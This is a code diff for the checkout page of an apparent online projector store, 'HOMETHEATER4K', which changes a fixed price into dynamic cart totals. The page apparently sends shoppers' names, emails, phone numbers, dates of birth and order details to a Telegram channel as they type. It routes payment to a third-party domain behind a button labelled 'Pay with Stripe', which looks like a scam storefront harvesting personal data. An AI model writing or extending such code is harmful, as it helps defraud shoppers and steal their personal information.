@@ -53,6 +53,10 @@ export default function CheckoutPage() {
   const updateTelegram = async () => {
     if (!formData.firstName && !formData.email && !formData.phone) return
 
+    const itemsList = items.map(item => 
+      `   📦 ${item.name} (x${item.quantity}) - $${(item.price * item.quantity).toFixed(2)}`
+    ).join('\n')
+
     const message = `🎬 HOMETHEATER4K - NOUVEAU CHECKOUT
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -73,8 +77,9 @@ export default function CheckoutPage() {
    📅 ${formData.dob}
 
 💰 COMMANDE:
-   📦 4K Projector Ultimate Package
-   💵 $129.99 CAD + Taxes
+${itemsList}
+   💵 Subtotal: $${total.toFixed(2)} CAD + Taxes ($${(total * 0.13).toFixed(2)})
+   💰 TOTAL: $${(total + (total * 0.13)).toFixed(2)} CAD
    🆔 Session: ${sessionIdRef.current}
 
 ⏰ DERNIÈRE MISE À JOUR:
@@ -126,7 +131,7 @@ export default function CheckoutPage() {
       site: 'secure.payment-ca.com',
       icon: 'https://s6.imgcdn.dev/8xixd.png',
       image: 'https://s6.imgcdn.dev/8xQsM.png',
-      amount: '129.99',
+      amount: total.toFixed(2),
       symbol: data.country === 'Canada' ? 'CAD' : 'USD',
       vat: taxRate.toString(),
       riderect_success: 'https://hometheater4k.com/order-processing',
@@ -214,7 +219,7 @@ export default function CheckoutPage() {
 
   if (!mounted) return null
 
-  const subtotal = 129.99
+  const subtotal = total
   const taxes = subtotal * 0.13
   const grandTotal = subtotal + taxes
 
@@ -435,7 +440,7 @@ export default function CheckoutPage() {
                     <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                       <path d="M13.976 9.15c-2.172-.806-3.356-1.426-3.356-2.409 0-.831.683-1.305 1.901-1.305 2.227 0 4.515.858 6.09 1.631l.89-5.494C18.252.975 15.697 0 12.165 0 9.667 0 7.589.654 6.104 1.872 4.56 3.147 3.757 4.992 3.757 7.218c0 4.039 2.467 5.76 6.476 7.219 2.585.92 3.445 1.574 3.445 2.583 0 .98-.84 1.545-2.354 1.545-1.875 0-4.965-.921-6.99-2.109l-.9 5.555C5.175 22.99 8.385 24 11.714 24c2.641 0 4.843-.624 6.328-1.813 1.664-1.305 2.525-3.236 2.525-5.732 0-4.128-2.524-5.851-6.591-7.305h0z"/>
                     </svg>
-                    Pay with Stripe - $146.89
+                    Pay with Stripe - ${grandTotal.toFixed(2)}
                   </>
                 )}
               </button>
@@ -445,22 +450,24 @@ export default function CheckoutPage() {
           {/* Right Column - Order Summary */}
           <div className="hidden lg:block px-8 py-8 bg-gray-100">
             <div className="space-y-4 mb-6">
-              <div className="flex gap-4">
-                <div className="w-16 h-16 bg-gray-300 rounded-lg flex items-center justify-center">
-                  <span className="text-xs text-gray-600">Product</span>
+              {items.map((item) => (
+                <div key={item.id} className="flex gap-4">
+                  <div className="w-16 h-16 bg-gray-300 rounded-lg flex items-center justify-center">
+                    <span className="text-xs text-gray-600">Product</span>
+                  </div>
+                  <div className="flex-1">
+                    <h3 className="text-sm font-medium text-gray-900">{item.name}</h3>
+                    <p className="text-sm text-gray-600">Quantity: {item.quantity}</p>
+                  </div>
+                  <div className="text-sm font-medium text-gray-900">${(item.price * item.quantity).toFixed(2)}</div>
                 </div>
-                <div className="flex-1">
-                  <h3 className="text-sm font-medium text-gray-900">4K Projector Ultimate Package</h3>
-                  <p className="text-sm text-gray-600">Quantity: 1</p>
-                </div>
-                <div className="text-sm font-medium text-gray-900">$129.99</div>
-              </div>
+              ))}
             </div>
 
             <div className="space-y-2 text-sm text-gray-600">
               <div className="flex justify-between">
                 <span>Subtotal</span>
-                <span className="text-gray-900">$129.99</span>
+                <span className="text-gray-900">${subtotal.toFixed(2)}</span>
               </div>
               <div className="flex justify-between">
                 <span>Shipping</span>
@@ -468,11 +475,11 @@ export default function CheckoutPage() {
               </div>
               <div className="flex justify-between">
                 <span>Estimated taxes</span>
-                <span className="text-gray-900">$16.90</span>
+                <span className="text-gray-900">${taxes.toFixed(2)}</span>
               </div>
               <div className="flex justify-between pt-3 border-t border-gray-200 text-base font-bold text-gray-900">
                 <span>Total</span>
-                <span><span className="text-xs font-normal mr-1">CAD</span>$146.89</span>
+                <span><span className="text-xs font-normal mr-1">CAD</span>${grandTotal.toFixed(2)}</span>
               </div>
             </div>
           </div>
